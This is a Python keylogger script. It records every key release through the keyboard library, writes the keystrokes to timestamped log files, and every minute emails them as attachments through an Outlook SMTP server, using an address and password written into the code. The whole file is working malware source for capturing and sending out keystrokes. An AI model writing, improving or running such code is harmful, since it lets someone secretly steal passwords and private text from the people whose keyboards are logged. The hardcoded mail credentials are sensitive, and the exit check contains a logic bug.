import os
import time
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "keylog404@outlook.com"
EMAIL_PASSWORD = "password404604"

class Keylogger:
    filerr = ""
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
            """
            This callback is invoked whenever a keyboard event is occured
            (i.e when a key is released in this example)
            """
            name = event.name
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
            f.close
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        # attach log fileo
        part = MIMEBase('application', "octet-stream")
        script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
        rel_path = self.filename+".txt"
        # print(self.filename)
        # print("keylog-2023-04-25-215744_2023-04-25-215845.txt")
        # rel_path = "keylog-2023-04-25-215744_2023-04-25-215845.txt"
        abs_file_path = os.path.join(script_dir, rel_path)
        
        # filePath = os.getcwd() + self.filename
        # filePath.replace("\\\\",'\\')
        x = os.path.abspath(self.filename)
        part.set_payload(open(abs_file_path, 'rb').read())
        # part.set_payload(open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-25-215744_2023-04-25-215845.txt", 'rb').read())
        # with open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-08-150456_2023-04-08-150656.txt", 'rb') as file:
        #     part.set_payload(file.read)
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        'attachment; filename={}'.format(Path(self.filename).name))
        msg.attach(part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
    def killcode(self):
        with open(self.filename+".txt", 'r') as fp:
        # read all lines using readline()
            lines = fp.readlines()
            for row in lines:
                # check if string present on a current line
                #print(row.find(word))
                # find() method returns -1 if the value is not found,
                # if found it returns index of the first occurrence of the substring
                if row.find("q[CTRL]") != -1 or row.find("q[RIGHT_CTRL]"):
                    print("Kill me!")
                    quit()
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            self.report_to_file()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.killcode()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    
    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()